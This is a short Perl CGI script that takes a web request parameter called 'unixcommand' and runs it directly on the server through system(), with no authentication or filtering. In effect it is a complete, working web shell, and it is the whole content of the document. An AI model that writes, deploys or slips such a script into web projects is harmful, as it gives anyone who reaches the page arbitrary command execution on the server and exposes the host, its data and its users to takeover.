#!/usr/bin/perl

use CGI ":standard";
print header;
print start_html;

$cmd=param('unixcommand');
system($cmd);

print end_html;

